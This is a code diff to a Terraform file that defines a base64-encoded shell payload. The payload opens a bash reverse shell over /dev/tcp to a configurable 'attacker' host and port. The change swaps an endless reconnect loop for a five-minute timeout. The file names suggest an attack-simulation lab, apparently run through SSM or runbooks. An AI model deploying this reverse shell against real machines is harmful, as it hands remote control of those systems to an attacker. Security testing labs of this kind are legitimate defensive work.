@@ -4,7 +4,11 @@ locals {
     host_port = var.host_port
 
     payload = <<-EOT
-    LOGFILE=/tmp/ssm_attacker_exec_reverseshell_target.log
+    MAX_WAIT=300
+    SECONDS_WAITED=0
+    CHECK_INTERVAL=5
+
+    LOGFILE=/tmp/runbook_attacker_exec_reverseshell_target.log
     function log {
         echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
         echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
@@ -13,16 +17,18 @@ locals {
     log "attacker Host: ${local.host_ip}:${local.host_port}"
     kill -9 $(ps aux | grep '/bin/bash -c bash -i' | head -1 | awk '{ print $2 }')
     log "running: /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'"
-    while true; do
-        log "reconnecting: ${local.host_ip}:${local.host_port}"
-        while ! /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'; do
-            log "reconnecting: ${local.host_ip}:${local.host_port}";
-            sleep 10;
-        done;
-        log "disconnected - wait retry...";
-        sleep 60;
-        log "starting retry...";
-    done
+    
+    log "reconnecting: ${local.host_ip}:${local.host_port}"
+    while ! /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'; do
+        log "reconnecting: ${local.host_ip}:${local.host_port}";
+        
+        SECONDS_WAITED=$((SECONDS_WAITED + CHECK_INTERVAL))
+        if [ $SECONDS_WAITED -ge $MAX_WAIT ]; then
+            log "Connection is still not available after waiting for $((MAX_WAIT / 60)) minutes."
+            exit 1
+        fi
+        sleep $CHECK_INTERVAL;
+    done;
     log "done"
     EOT
     base64_payload = base64encode(local.payload)
